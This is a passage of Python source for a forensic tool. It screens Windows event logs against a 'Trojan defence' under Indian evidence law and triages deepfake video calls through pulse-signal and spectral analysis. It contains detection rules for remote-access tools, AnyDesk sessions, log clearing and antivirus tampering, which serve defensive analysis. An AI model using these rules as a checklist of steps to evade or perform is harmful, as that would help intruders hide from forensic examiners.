        normalize_event(ev)
        cmd = ev.get("command_line")
        if not cmd or not isinstance(cmd, str):
            return None
        res = self.analyze_command(cmd, ev.get("image"), ev.get("parent_image"))
        if res["threat_score"] < threshold:
            return None
        families = {i["family"] for i in res["indicators"]}
        category = ("LOLBINS_COMMAND" if families - {"lineage", "obfuscation", "entropy"}
                    else "SUSPICIOUS_PROCESS_LINEAGE" if "lineage" in families else "OBFUSCATED_COMMAND")
        res.update({"event_id": ev.get("event_id"), "timestamp_utc": ev.get("timestamp"),
                    "user": ev.get("user"), "logon_type": ev.get("logon_type"),
                    "host": ev.get("host")})
        return {"category": category, "score": res["threat_score"], "mitre": res["primary_mitre"],
                "details": res, "event": ev,
                "ref": evidence_ref(artifact_id, ev.get("_offset", 0), ev.get("_length", 0))}

    # ----- Section 45 BSA exculpatory checklist ---------------------------- #

    @staticmethod
    def classify_logon(logon_type: Any) -> str:
        return {2: "INTERACTIVE_CONSOLE", 3: "NETWORK", 4: "BATCH", 5: "SERVICE", 7: "UNLOCK",
                8: "NETWORK_CLEARTEXT", 9: "NEW_CREDENTIALS", 10: "REMOTE_INTERACTIVE",
                11: "CACHED_INTERACTIVE"}.get(_to_int(logon_type), "UNKNOWN")

    def section45_exculpatory_checklist(self, target: Dict[str, Any], events: Sequence[Dict[str, Any]],
                                        device_owner: Optional[str] = None,
                                        window_s: float = 24 * 3600,
                                        post_window_s: float = 24 * 3600) -> Dict[str, Any]:
        """
        14 checks against the "Trojan defence". Each check either supports attribution to the
        local user, supports the remote-intrusion hypothesis, or is undetermined. The ratio is a
        transparent count, not a calibrated probability.

        Remote-access checks look at the 24 h before the command; anti-forensic checks (service
        installs, tasks, AV tampering, log clearing, account and clock changes) also look at the
        24 h after it, because intruders usually clean up after acting. PascalCase Sysmon keys are
        accepted, accounts are compared without their DOMAIN\\ or HOST\\ prefix, and lineage is
        rebuilt through ProcessId/ParentProcessId when the log carries them.
        """
        normalize_event(target)
        for e in events:
            normalize_event(e)
        t_target = parse_timestamp(target["timestamp"])
        before, around = [], []
        for e in events:
            if e is target or e.get("timestamp") in (None, ""):
                continue
            try:
                t = parse_timestamp(e["timestamp"])
            except (ValueError, TypeError, OverflowError):
                continue
            if t_target - window_s <= t <= t_target:
                before.append(e)
            if t_target - window_s <= t <= t_target + post_window_s:
                around.append(e)

        def none_of(pool, pred) -> bool:
            return not any(pred(e) for e in pool)

        def eid(e) -> Optional[int]:
            return _to_int(e.get("event_id"))

        session = self.classify_logon(target.get("logon_type"))
        analysis = self.analyze_command(str(target.get("command_line") or ""), target.get("image"),
                                        target.get("parent_image"))
        lineage = self.process_ancestry(target, events)
        names = [a["image"] for a in lineage["ancestors"]]
        remote_ancestor = next((n for n in names if n in _REMOTE_TOOLS | _REMOTE_DAEMONS), None)
        if remote_ancestor:
            desktop: Optional[bool] = False
        elif lineage["complete"]:
            desktop = True
        else:
            desktop = None     # e.g. parent is cmd.exe but its own parent was not logged

        def ext_ip(e) -> bool:
            try:
                return ipaddress.ip_address(str(e.get("source_ip")).strip("[]")).is_global
            except ValueError:
                return False

        checks: List[Tuple[str, str, Optional[bool]]] = [
            ("C01_SESSION_LOGON_TYPE", f"Command ran in a local interactive desktop session ({session})",
             True if session in ("INTERACTIVE_CONSOLE", "CACHED_INTERACTIVE", "UNLOCK")
             else None if session == "UNKNOWN" else False),
            ("C02_NO_REMOTE_TOOL_PROCESS", "No remote-access tool or remote-management daemon process in the prior 24 h",
             none_of(before, lambda e: _basename(e.get("image")) in _REMOTE_TOOLS | (_REMOTE_DAEMONS - {
                 "services.exe", "msiexec.exe", "taskeng.exe", "taskhostw.exe", "wmiprvse.exe"}))),
            ("C03_NO_RDP_LOGON", "No RemoteInteractive (type 10) logon in the prior 24 h",
             none_of(before, lambda e: eid(e) == 4624 and _to_int(e.get("logon_type")) == 10)),
            ("C04_NO_REMOTE_SESSION_TRACE", "No inbound AnyDesk/remote-desktop connection trace in the prior 24 h",
             none_of(before, lambda e: e.get("event_id") == "ANYDESK_INCOMING")),
            ("C05_NO_EXTERNAL_NETWORK_LOGON", "No network logon (type 3) from a public IP in the prior 24 h",
             none_of(before, lambda e: eid(e) == 4624 and _to_int(e.get("logon_type")) == 3 and ext_ip(e))),
            ("C06_USER_IS_DEVICE_OWNER", "Account that ran the command is the device owner's",
             None if not device_owner or not target.get("user")
             else _account_name(target["user"]) == _account_name(device_owner)),
            ("C07_NO_NEW_SERVICE", "No service installed (7045/4697) within 24 h either side",
             none_of(around, lambda e: eid(e) in (7045, 4697))),
            ("C08_NO_NEW_SCHEDULED_TASK", "No scheduled task created (4698) within 24 h either side",
             none_of(around, lambda e: eid(e) == 4698)),
            ("C09_NO_AV_TAMPERING", "No Defender protection disabled (5001/5007/5010/5012) within 24 h either side",
             none_of(around, lambda e: eid(e) in (5001, 5007, 5010, 5012))),
            ("C10_NO_LOG_CLEARING", "No audit log cleared (1102/104) within 24 h either side",
             none_of(around, lambda e: eid(e) in (1102, 104))),
            ("C11_NO_ACCOUNT_CHANGES", "No account created or added to a privileged group (4720/4728/4732) within 24 h either side",
             none_of(around, lambda e: eid(e) in (4720, 4728, 4732))),
            ("C12_NO_CLOCK_TAMPERING", "No system time change (4616) within 24 h either side",
             none_of(around, lambda e: eid(e) == 4616)),
            ("C13_DESKTOP_LINEAGE", "Process tree leads back to the desktop shell with no remote tool or daemon in it",
             desktop),
            ("C14_NO_ANOMALOUS_PARENT", "No anomalous parent-child relationship for the command",
             None if not target.get("parent_image") else analysis["parent_child_penalty"] == 0),
        ]
        rows, attrib, intrusion = [], 0, 0
        for cid, question, verdict in checks:
            status = ("UNDETERMINED" if verdict is None else
                      "SUPPORTS_ATTRIBUTION" if verdict else "SUPPORTS_INTRUSION_HYPOTHESIS")
            attrib += verdict is True
            intrusion += verdict is False
            rows.append({"check": cid, "question": question, "result": status})
        evaluated = attrib + intrusion
        return {
            "statute": "Section 45, Bharatiya Sakshya Adhiniyam, 2023 (grounds of opinion) read with Section 39 "
                       "(opinions of experts) - Trojan-defence screen",
            "target_timestamp_utc": iso_utc(t_target),
            "session_class": session,
            "logon_type": _to_int(target.get("logon_type")),
            "process_lineage": names,
            "lineage_complete": lineage["complete"],
            "remote_ancestor": remote_ancestor,
            "checks_evaluated": len(rows),
            "checks_determined": evaluated,
            "supports_attribution": attrib,
            "supports_intrusion_hypothesis": intrusion,
            "trojan_defense_probability": _r(intrusion / evaluated) if evaluated else None,
            "method_note": "trojan_defense_probability = checks supporting intrusion / checks determined; "
                           "a transparent ratio for the examiner, not a calibrated likelihood.",
            "checks": rows,
        }

    @staticmethod
    def process_ancestry(target: Dict[str, Any], events: Sequence[Dict[str, Any]],
                         max_depth: int = 16) -> Dict[str, Any]:
        """
        Walk ParentProcessGuid / ParentProcessId links through process-creation events, nearest
        ancestor first, stopping at the desktop shell. 'complete' is True only when the walk reached
        explorer.exe/userinit.exe; a chain that ends on a process whose own creation was not logged
        (e.g. cmd.exe with an unknown parent) is incomplete.
        """
        by_guid: Dict[str, Dict[str, Any]] = {}
        by_pid: Dict[int, List[Dict[str, Any]]] = defaultdict(list)
        for e in events:
            normalize_event(e)
            if not e.get("image"):
                continue
            if e.get("process_guid"):
                by_guid[str(e["process_guid"]).lower()] = e
            pid = _to_int(e.get("process_id"))
            if pid is not None:
                by_pid[pid].append(e)

        def ts(e: Dict[str, Any]) -> Optional[float]:
            try:
                return parse_timestamp(e["timestamp"])
            except (KeyError, ValueError, TypeError, OverflowError):
                return None

        def lookup(cur: Dict[str, Any], seen: set) -> Optional[Dict[str, Any]]:
            if cur.get("parent_process_guid"):
                p = by_guid.get(str(cur["parent_process_guid"]).lower())
                if p is not None and id(p) not in seen:
                    return p
            ppid = _to_int(cur.get("parent_process_id"))
            if ppid is None:
                return None
            t_cur = ts(cur)
            cands = [p for p in by_pid.get(ppid, []) if id(p) not in seen
                     and (_basename(p.get("image")) == _basename(cur.get("parent_image")) or not cur.get("parent_image"))]
            if t_cur is not None:  # PIDs are reused: latest creation not after the child
                cands = [p for p in cands if ts(p) is not None and ts(p) <= t_cur]
            return max(cands, key=lambda p: ts(p) or 0.0) if cands else None

        ancestors: List[Dict[str, Any]] = []
        cur, seen, complete = target, {id(target)}, False
        for _ in range(max_depth):
            parent = lookup(cur, seen)
            if parent is None:
                if cur.get("parent_image"):
                    ancestors.append({"image": _basename(cur["parent_image"]),
                                      "process_id": _to_int(cur.get("parent_process_id")), "logged": False})
                    complete = ancestors[-1]["image"] in _DESKTOP_ROOTS
                break
            seen.add(id(parent))
            ancestors.append({"image": _basename(parent.get("image")),
                              "process_id": _to_int(parent.get("process_id")), "logged": True})
            if ancestors[-1]["image"] in _DESKTOP_ROOTS:
                complete = True
                break
            cur = parent
        return {"ancestors": ancestors, "complete": complete}


def _to_int(v: Any) -> Optional[int]:
    try:
        return int(v)
    except (TypeError, ValueError, OverflowError):   # OverflowError: int(float('inf'))
        return None


# --------------------------------------------------------------------------- #
# Sub-engine 2: Synthetic media & deepfake triage                             #
# --------------------------------------------------------------------------- #

def _hann(n: int) -> List[float]:
    return [0.5 - 0.5 * math.cos(2 * math.pi * i / (n - 1)) for i in range(n)] if n > 1 else [1.0]


def _dft_at(x: Sequence[float], fs: float, f: float) -> complex:
    """Single-frequency DFT (no bin quantisation) of an already windowed series."""
    if _np is not None:
        n = _np.arange(len(x))
        return complex(_np.sum(_np.asarray(x) * _np.exp(-2j * _np.pi * f * n / fs)))
    step = cmath.exp(-2j * math.pi * f / fs)
    z, acc = 1 + 0j, 0j
    for i, v in enumerate(x):
        if i & 1023 == 0:  # re-seed the phasor so rounding error cannot accumulate
            z = cmath.exp(-2j * math.pi * f * i / fs)
        acc += v * z
        z *= step
    return acc


def _prep(x: Sequence[float]) -> List[float]:
    """Remove mean and linear trend, apply a Hann window."""
    n = len(x)
    if n < 2:
        return list(x)
    tm = (n - 1) / 2.0
    xm = sum(x) / n
    denom = sum((i - tm) ** 2 for i in range(n)) or 1.0
    slope = sum((i - tm) * (v - xm) for i, v in enumerate(x)) / denom
    win = _hann(n)
    return [(v - xm - slope * (i - tm)) * win[i] for i, v in enumerate(x)]


def _std(x: Sequence[float]) -> float:
    if len(x) < 2:
        return 0.0
    m = sum(x) / len(x)
    return math.sqrt(sum((v - m) ** 2 for v in x) / (len(x) - 1))


def _wrap(phi: float) -> float:
    return (phi + math.pi) % (2 * math.pi) - math.pi


@functools.lru_cache(maxsize=8)
def _dct_matrix(n: int) -> Tuple[Tuple[float, ...], ...]:
    return tuple(tuple(r) for r in [[(math.sqrt(1.0 / n) if k == 0 else math.sqrt(2.0 / n)) * math.cos(math.pi * (2 * i + 1) * k / (2 * n))
             for i in range(n)] for k in range(n)])


def _matmul(a: List[List[float]], b: List[List[float]]) -> List[List[float]]:
    bt = list(zip(*b))
    return [[sum(x * y for x, y in zip(row, col)) for col in bt] for row in a]


def dct2(img: Sequence[Sequence[float]]) -> List[List[float]]:
    """Orthonormal 2D DCT-II of a square block."""
    n = len(img)
    if _np is not None:
        c = _np.asarray(_dct_matrix(n))
        return (c @ _np.asarray(img, dtype=float) @ c.T).tolist()
    c = _dct_matrix(n)
    ct = [list(r) for r in zip(*c)]
    return _matmul(_matmul(c, [list(map(float, r)) for r in img]), ct)


def idct2(coef: Sequence[Sequence[float]]) -> List[List[float]]:
    n = len(coef)
    if _np is not None:
        c = _np.asarray(_dct_matrix(n))
        return (c.T @ _np.asarray(coef, dtype=float) @ c).tolist()
    c = _dct_matrix(n)
    ct = [list(r) for r in zip(*c)]
    return _matmul(_matmul(ct, [list(r) for r in coef]), c)


_PGM_WS = b" \t\r\n\x0b\x0c"


def _pgm_header(data: bytes) -> Tuple[int, int, int, int]:
    """
    Linear-time P5 header tokenizer (width, height, maxval, pixel offset). Replaces a regex whose
    nested comment group backtracked exponentially on headers such as 'P5 # # # ... x'.
    Comments ('#' to end of line) may appear wherever whitespace may; exactly one whitespace byte
    follows maxval, as before.
    """
    if data[:2] != b"P5" or len(data) < 3 or data[2] not in _PGM_WS:
        raise ValueError("not an 8-bit binary PGM")
    pos, vals = 2, []
    while len(vals) < 3:
        gap = pos
        while pos < len(data):
            c = data[pos]
            if c in _PGM_WS:
                pos += 1
            elif c == 0x23:  # '#': comment to end of line
                nl = data.find(b"\n", pos)
                if nl < 0:
                    raise ValueError("not an 8-bit binary PGM")
                pos = nl + 1
            else:
                break
        start = pos
        while pos < len(data) and 0x30 <= data[pos] <= 0x39 and pos - start <= 10:
            pos += 1
        if pos == start or pos == gap or pos - start > 10:
            raise ValueError("not an 8-bit binary PGM")
        vals.append(int(data[start:pos]))
    if pos >= len(data) or data[pos] not in _PGM_WS:
        raise ValueError("not an 8-bit binary PGM")
    return vals[0], vals[1], vals[2], pos + 1


def parse_pgm(data: bytes, crop: Optional[int] = None) -> Tuple[List[List[int]], int]:
    """
    Binary PGM (P5, 8-bit). Returns (pixels, byte offset of the pixel block). Zero or negative
    dimensions are rejected and the pixel block must be present before anything is allocated. With
    crop=N only the centre min(w, h, N) square is materialised (the same block analyze_spectrum
    takes), so a large frame costs O(N^2) memory instead of a Python list per row.
    """
    w, h, maxval, start = _pgm_header(data)
    if maxval > 255:
        raise ValueError("not an 8-bit binary PGM")
    if w <= 0 or h <= 0:
        raise ValueError(f"PGM has a zero dimension ({w} x {h})")
    if w * h > len(data) - start:
        raise ValueError("truncated PGM")
    if crop is not None:
        n = min(w, h, crop)
        y0, x0 = (h - n) // 2, (w - n) // 2
        return [list(data[start + (y0 + r) * w + x0:start + (y0 + r) * w + x0 + n]) for r in range(n)], start
    px = data[start:start + w * h]
    return [list(px[r * w:(r + 1) * w]) for r in range(h)], start


def write_pgm(pixels: Sequence[Sequence[float]]) -> bytes:
    h, w = len(pixels), len(pixels[0])
    body = bytes(max(0, min(255, int(round(v)))) for row in pixels for v in row)
    return f"P5\n{w} {h}\n255\n".encode() + body


RPPG_MAGIC = b"SRPG"


def pack_rppg_trace(fps: float, jaw_g: Sequence[float], forehead_g: Sequence[float],
                    jaw_r: Optional[Sequence[float]] = None, session_id: str = "") -> bytes:
    """
    ROI trace container written by the frame extractor: 'SRPG', u16 version, f32 fps, u32 samples,
    u8 channel count, u8 session-id length, session id, then float32 little-endian channels
    (jaw green, forehead green, optional jaw red).
    """
    chans = [jaw_g, forehead_g] + ([jaw_r] if jaw_r is not None else [])
    sid = session_id.encode()[:255]
    head = RPPG_MAGIC + struct.pack("<HfIBB", 1, fps, len(jaw_g), len(chans), len(sid)) + sid
    return head + b"".join(struct.pack(f"<{len(c)}f", *c) for c in chans)


def unpack_rppg_trace(data: bytes) -> Dict[str, Any]:
    """Parse an SRPG container, checking every length against the buffer before reading."""
    head = struct.calcsize("<HfIBB")
    if len(data) < 4 + head or data[:4] != RPPG_MAGIC:
        raise ValueError("not an SRPG trace")
    _, fps, n, nch, slen = struct.unpack_from("<HfIBB", data, 4)
    pos = 4 + head
    if nch < 2 or pos + slen + 4 * n * nch > len(data):
        raise ValueError(f"truncated SRPG trace ({nch} channels x {n} samples declared)")
    sid = data[pos:pos + slen].decode("utf-8", "replace")
    pos += slen
    chans = []
    for _ in range(nch):
        chans.append(list(struct.unpack_from(f"<{n}f", data, pos)))
        pos += 4 * n
    return {"fps": fps, "session_id": sid, "jaw_g": chans[0], "forehead_g": chans[1],
            "jaw_r": chans[2] if nch > 2 else None, "length": pos}


VIRTUAL_CAMERA_NAMES = ("obs virtual camera", "obs-camera", "obs virtualcam", "manycam", "splitcam",
                        "deepfacelive", "xsplit vcam", "snap camera", "e2esoft vcam", "vcam", "altercam",
                        "chromacam", "avatarify", "youcam")
VIDEO_INPUT_CATEGORY = "{860bb310-5d01-11d0-bd3b-00a0c911ce86}"

_IP_TOKEN = r"\[?[0-9A-Fa-f.:]+(?:%[\w.\-]+)?\]?"
_ICE_CANDIDATE = re.compile(
    r"candidate:(\S+)\s+(\d+)\s+(udp|tcp|ssltcp|tls|tcp-act|tcp-pass)\s+(\d+)\s+(" + _IP_TOKEN + r")\s+(\d+)"
    r"\s+typ\s+(host|srflx|prflx|relay)(?:\s+raddr\s+(" + _IP_TOKEN + r")\s+rport\s+(\d+))?", re.I)
_STUN_URI = re.compile(r"\b(stuns?|turns?):(\[[0-9A-Fa-f:]+\]|[A-Za-z0-9.\-]+)(?::(\d+))?", re.I)
_CALL_ID = re.compile(r"call[-_ ]?id[=:]\s*([A-Za-z0-9_.\-]+)", re.I)
_LOG_TS = re.compile(r"^(\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}(?:\.\d+)?)")
_ANYDESK_LINE = re.compile(
    r"^\s*(Incoming|Outgoing)\s+(\d{4}-\d{2}-\d{2}),?\s+(\d{2}:\d{2}(?::\d{2})?)\s+(\S+)\s+(\d{9,10})\s+(\d{9,10})",
    re.I)


class DeepfakeTriageEngine:
    """'Digital arrest' coercion calls: rPPG physics, spectral decay, WebRTC and seized-rig artifacts."""

    HR_BAND = (0.7, 3.0)
    PTT_AUTHENTIC_RAD = (0.09, 0.34)
    PTT_SYNTHETIC_RAD = 0.04
    DICROTIC_RANGE = (0.15, 0.48)
    CHROMA_RANGE = (1.8, 3.2)
    HF_ZONE = 0.75            # fraction of Nyquist
    HF_EXCESS_THRESHOLD = 3.0       # observed / power-law-predicted energy over the whole HF zone
    NYQUIST_PEAK_THRESHOLD = 8.0    # same ratio for the 2x2 block at the Nyquist corner
    MAX_DCT_DIM = 128               # centre crop bound for the spectral block
    MIN_DCT_DIM = 8
    QP_GATE = 36

    def __init__(self, onnx_model_path: Optional[str] = None):
        self.onnx_session = None
        if onnx_model_path and _ort is not None and os.path.isfile(onnx_model_path):
            self.onnx_session = _ort.InferenceSession(onnx_model_path, providers=["CPUExecutionProvider"])

    # ----- rPPG hemodynamics ----------------------------------------------- #

    def _dominant_hr(self, x: List[float], fs: float) -> Tuple[float, float]:
        lo, hi = self.HR_BAND[0], min(self.HR_BAND[1], 0.45 * fs)
        best_f, best_p, total, count = lo, -1.0, 0.0, 0
        f = lo
        while f <= hi + 1e-9:
            p = abs(_dft_at(x, fs, f)) ** 2
            total += p
            count += 1
            if p > best_p:
                best_f, best_p = f, p
            f += 0.01
        for k in range(-10, 11):  # refine on a 1 mHz grid around the coarse peak
            fr = best_f + k * 0.001
            if lo <= fr <= hi:
                p = abs(_dft_at(x, fs, fr)) ** 2
                if p > best_p:
                    best_f, best_p = fr, p
        snr = best_p / (total / count) if total > 0 and count else 0.0
        return best_f, snr

    def _band_snr(self, x: List[float], fs: float, f0: float) -> float:
        """Power at f0 over the mean power across the heart-rate band (same grid as _dominant_hr)."""
        lo, hi = self.HR_BAND[0], min(self.HR_BAND[1], 0.45 * fs)
        total, count, f = 0.0, 0, lo
        while f <= hi + 1e-9:
            total += abs(_dft_at(x, fs, f)) ** 2
            count += 1
            f += 0.01
        return abs(_dft_at(x, fs, f0)) ** 2 / (total / count) if total > 0 else 0.0

    def _phase_jitter(self, jaw: Sequence[float], fore: Sequence[float], fs: float, f_hr: float
                      ) -> Tuple[Optional[float], float]:
        """
        Circular std of the jaw-forehead phase across overlapping 4 s sub-windows (hop 2 s), and the
        median forehead pulse SNR of those windows (a real pulse in every window with jumping phase is
        a discontinuity; a noisy forehead is not).
        """
        win, hop = int(round(4 * fs)), int(round(2 * fs))
        if win < 8 or len(jaw) < win + hop:
            return None, 0.0
        phases, snrs = [], []
        for start in range(0, len(jaw) - win + 1, hop):
            xj, xf = _prep(jaw[start:start + win]), _prep(fore[start:start + win])
            phases.append(_wrap(cmath.phase(_dft_at(xj, fs, f_hr)) - cmath.phase(_dft_at(xf, fs, f_hr))))
            snrs.append(self._band_snr(xf, fs, f_hr))
        c = sum(math.cos(p) for p in phases) / len(phases)
        s_ = sum(math.sin(p) for p in phases) / len(phases)
        rlen = min(1.0, math.hypot(c, s_))
        snrs.sort()
        return (math.sqrt(-2 * math.log(rlen)) if rlen > 0 else float("inf")), snrs[len(snrs) // 2]

    def analyze_rppg(self, jaw_g: Sequence[float], forehead_g: Sequence[float], fps: float,
                     jaw_r: Optional[Sequence[float]] = None) -> Dict[str, Any]:
        """
        Pulse transit phase between the perioral/jaw ROI and the supraorbital ROI at the heart-rate
        fundamental. Real faces: forehead lags jaw by 12-45 ms (0.09-0.34 rad at 1.0-1.8 Hz).
        Frame-wide shader/relighting artifacts move every pixel together (< 0.04 rad). A forehead
        that leads the jaw (blood flowing backwards) or a phase that jumps between sub-windows
        (a face-swap model re-anchoring) is also flagged. Bad input returns an INDETERMINATE verdict
        instead of raising.
        """
        def indeterminate(reason: str, **extra: Any) -> Dict[str, Any]:
            out = {"heart_rate_hz": None, "heart_rate_bpm": None, "pulse_snr": None,
                   "forehead_pulse_snr": None, "ptt_phase_delta_rad": None, "ptt_delay_ms": None,
                   "ptt_in_physiological_window": None, "subwindow_phase_jitter_rad": None,
                   "dicrotic_harmonic_ratio": None, "dicrotic_in_range": None,
                   "green_red_chroma_ratio": None, "chroma_in_range": None,
                   "verdict": reason, "threat_score": 0.0, "neural_prefilter_score": None}
            out.update(extra)
            return out

        if not _finite(fps) or fps <= 0:
            return indeterminate("INDETERMINATE_INVALID_FPS")
        n = min(len(jaw_g), len(forehead_g))
        jaw_g, forehead_g = list(jaw_g[:n]), list(forehead_g[:n])
        if jaw_r is not None:
            jaw_r = list(jaw_r[:n]) if len(jaw_r) >= n else None
        if n < int(4 * fps) or n < 16:
            return indeterminate("INDETERMINATE_TRACE_TOO_SHORT", samples=n)
        if not all(math.isfinite(v) for v in jaw_g + forehead_g + list(jaw_r or [])):
            return indeterminate("INDETERMINATE_NON_FINITE_SAMPLES")
        if fps < 2 * self.HR_BAND[1]:
            return indeterminate("INDETERMINATE_SUB_NYQUIST_FPS", fps=_r(fps, 2))
        for trace in (jaw_g, forehead_g):
            mu, sd = sum(trace) / n, _std(trace)
            if mu < 15.0 or sd / mu < 1e-4:
                return indeterminate("INDETERMINATE_LOW_CONTRAST", roi_mean=_r(mu, 2),
                                     roi_ac_dc_ratio=_r(sd / mu if mu > 0 else 0.0, 6))
        xj, xf = _prep(jaw_g), _prep(forehead_g)
        f_hr, snr = self._dominant_hr(xj, fps)
        snr_f = self._band_snr(xf, fps, f_hr)
        Xj, Xf = _dft_at(xj, fps, f_hr), _dft_at(xf, fps, f_hr)
        dphi = _wrap(cmath.phase(Xj) - cmath.phase(Xf))
        tau_ms = dphi / (2 * math.pi * f_hr) * 1000.0
        jitter, window_snr_f = self._phase_jitter(jaw_g, forehead_g, fps, f_hr)
        e1 = abs(Xj) ** 2
        dicrotic = None
        if 2 * f_hr < 0.5 * fps:  # second harmonic below Nyquist
            dicrotic = abs(_dft_at(xj, fps, 2 * f_hr)) ** 2 / e1 if e1 > 0 else 0.0
        chroma = None
        if jaw_r is not None:
            sr = _std(jaw_r)
            chroma = _std(jaw_g) / sr if sr > 0 else None
        if snr < 3.0:
            verdict, conf = "INDETERMINATE_LOW_PULSE_SNR", 0.0
        elif jitter is not None and jitter > 0.65 and window_snr_f >= 3.0:
            verdict, conf = "TEMPORAL_PHASE_DISCONTINUITY", 0.80
        elif snr_f < 3.0:
            verdict, conf = "INDETERMINATE_LOW_PULSE_SNR", 0.0
        elif abs(dphi) < self.PTT_SYNTHETIC_RAD:
            verdict, conf = "SYNTHETIC_RPPG_SHADER_INJECTION", 0.96
        elif dphi < -self.PTT_SYNTHETIC_RAD:
            verdict, conf = "REVERSED_PULSE_TRANSIT", 0.85
        elif 12.0 <= tau_ms <= 45.0:
            verdict, conf = "AUTHENTIC_PHYSIOLOGICAL_PTT", 0.0
        else:
            verdict, conf = "INDETERMINATE_PTT", 0.35
        dic_ok = None if dicrotic is None else self.DICROTIC_RANGE[0] <= dicrotic <= self.DICROTIC_RANGE[1]
        chroma_ok = None if chroma is None else self.CHROMA_RANGE[0] <= chroma <= self.CHROMA_RANGE[1]
        score = conf
        if verdict == "INDETERMINATE_PTT" and dic_ok is False:
            score = max(score, 0.55)
        neural = self._neural_prefilter(jaw_g, forehead_g)
        return {
            "heart_rate_hz": _r(f_hr), "heart_rate_bpm": _r(f_hr * 60, 1), "pulse_snr": _r(snr, 2),
            "forehead_pulse_snr": _r(snr_f, 2),
            "ptt_phase_delta_rad": _r(dphi), "ptt_delay_ms": _r(tau_ms, 2),
            "ptt_in_physiological_window": 12.0 <= tau_ms <= 45.0,
            "subwindow_phase_jitter_rad": _r(jitter) if jitter is not None else None,
            "dicrotic_harmonic_ratio": _r(dicrotic) if dicrotic is not None else None, "dicrotic_in_range": dic_ok,
            "green_red_chroma_ratio": None if chroma is None else _r(chroma), "chroma_in_range": chroma_ok,
            "verdict": verdict, "threat_score": _r(score),
            "neural_prefilter_score": neural,
        }

    def _neural_prefilter(self, jaw_g: Sequence[float], forehead_g: Sequence[float]) -> Optional[float]:
        """Optional ONNX pre-filter; recorded beside the physics verdict, never replacing it."""
        if self.onnx_session is None or _np is None:
            return None
        try:
            inp = self.onnx_session.get_inputs()[0]
            n = min(len(jaw_g), len(forehead_g))
            x = _np.asarray([jaw_g[:n], forehead_g[:n]], dtype=_np.float32)[None, ...]
            out = self.onnx_session.run(None, {inp.name: x})[0]
            return _r(float(_np.ravel(out)[-1]))
        except Exception:
            return None

    # ----- 2D-DCT spectral decay ------------------------------------------- #

    @staticmethod
    def qp_step(qp: float) -> float:
        """H.264/H.265 quantiser step size: 0.625 * 2^(QP/6)."""
        return 0.625 * 2.0 ** (qp / 6.0)

    @staticmethod
    def qp_relaxation(qp: Optional[float], alpha: Optional[float] = None) -> float:
        """
        High-frequency threshold multiplier above the QP gate: 1 + 0.05 (QP - 36). When the spectrum is
        steeper than any camera (alpha > 2.5, the signature of codec low-pass filtering rather than
        GAN upsampling) a quadratic term 0.01 (QP - 36)^2 is added.
        """
        if qp is None or not _finite(qp) or qp <= DeepfakeTriageEngine.QP_GATE:
            return 1.0
        d = qp - DeepfakeTriageEngine.QP_GATE
        relax = 1.0 + 0.05 * d
        if alpha is not None and alpha > 2.5:
            relax += 0.01 * d * d
        return relax

    @staticmethod
    def estimate_qp(pixels: Sequence[Sequence[float]]) -> float:
        """
        Heuristic QP estimate from 8x8 macroblock blockiness, measured across both vertical and
        horizontal block boundaries (mean step across boundaries over mean step inside blocks).
        1.0 -> ~QP 22 (clean); each +0.1 of blockiness adds ~2 QP.
        """
        inner, edge, ni, ne = 0.0, 0.0, 0, 0
        rows = [list(r) for r in pixels]
        cols = [list(c) for c in zip(*rows)] if rows else []
        for line in rows + cols:
            for x in range(1, len(line)):
                d = abs(line[x] - line[x - 1])
                if x % 8 == 0:
                    edge, ne = edge + d, ne + 1
                else:
                    inner, ni = inner + d, ni + 1
        if ne == 0 or ni == 0 or inner == 0:
            return 22.0
        blockiness = (edge / ne) / (inner / ni)
        return max(0.0, min(51.0, 22.0 + 20.0 * (blockiness - 1.0)))

    def analyze_spectrum(self, pixels: Sequence[Sequence[float]], qp: Optional[float] = None) -> Dict[str, Any]:
        """
        Fit E(f) ~ f^-alpha over the mid band; compare observed HF-zone energy and the Nyquist-corner
        block with the fit. The fit is extrapolated from the top of the fitted band with alpha capped
        at 3.0, and a quantiser noise floor is added, so codec roll-off (mid-band coefficients
        quantised to zero) cannot drive the prediction to ~0 and inflate the ratios. Frames are
        centre-cropped to MAX_DCT_DIM so the pure-Python DCT stays bounded.
        """
        def indeterminate(reason: str, n: int) -> Dict[str, Any]:
            return {"block_size": n, "spectral_alpha": None, "alpha_in_natural_range": None,
                    "hf_zone_fraction_of_nyquist": self.HF_ZONE, "hf_energy_excess_ratio": None,
                    "nyquist_peak_excess_ratio": None, "qp_estimate": None, "qp_source": None,
                    "qp_relaxation_factor": None, "hf_threshold_applied": None,
                    "nyquist_peak_threshold_applied": None, "verdict": reason, "threat_score": 0.0}

        h = len(pixels)
        w = min((len(r) for r in pixels), default=0)
        n = min(h, w, self.MAX_DCT_DIM)
        if n < self.MIN_DCT_DIM:
            return indeterminate("INDETERMINATE_FRAME_TOO_SMALL", n)
        y0, x0 = (h - n) // 2, (w - n) // 2
        block = [[float(v) for v in pixels[y0 + y][x0:x0 + n]] for y in range(n)]
        if not all(math.isfinite(v) for row in block for v in row):
            return indeterminate("INDETERMINATE_NON_FINITE_PIXELS", n)
        flat = [v for row in block for v in row]
        if _std(flat) < 0.5:
            return indeterminate("INDETERMINATE_LOW_CONTRAST", n)
        coef = dct2(block)
        nyq = float(n - 1)
        radial: Dict[int, List[float]] = defaultdict(list)
        hf: List[Tuple[float, float]] = []
        for u in range(n):
            for v in range(n):
                if u == 0 and v == 0:
                    continue
                r = math.hypot(u, v)
                e = coef[u][v] ** 2
                radial[int(round(r))].append(e)
                if r / nyq > self.HF_ZONE:
                    hf.append((r, e))
        xs, ys = [], []
        for rb, es in sorted(radial.items()):
            if 2 <= rb <= 0.6 * nyq:
                mean = sum(es) / len(es)
                if mean > 0:
                    xs.append(math.log(rb))
                    ys.append(math.log(mean))
        if len(xs) < 3:
            return indeterminate("INDETERMINATE_INSUFFICIENT_MIDBAND", n)
        mx, my = sum(xs) / len(xs), sum(ys) / len(ys)
        sxx = sum((x - mx) ** 2 for x in xs) or 1.0
        slope = sum((x - mx) * (y - my) for x, y in zip(xs, ys)) / sxx
        intercept = my - slope * mx
        alpha = -slope
        alpha_extrap = min(max(alpha, 0.0), 3.0)
        r_ref = math.exp(max(xs))
        e_ref = math.exp(intercept + slope * math.log(r_ref))
        qp_used = self.estimate_qp(block) if qp is None else float(qp)
        floor = (self.qp_step(qp_used) / 8.0) ** 2 / 12.0  # residual quantiser noise per coefficient

        def fit(r: float) -> float:
            if r <= r_ref:
                return math.exp(intercept + slope * math.log(r)) + floor
            return e_ref * (r / r_ref) ** (-alpha_extrap) + floor

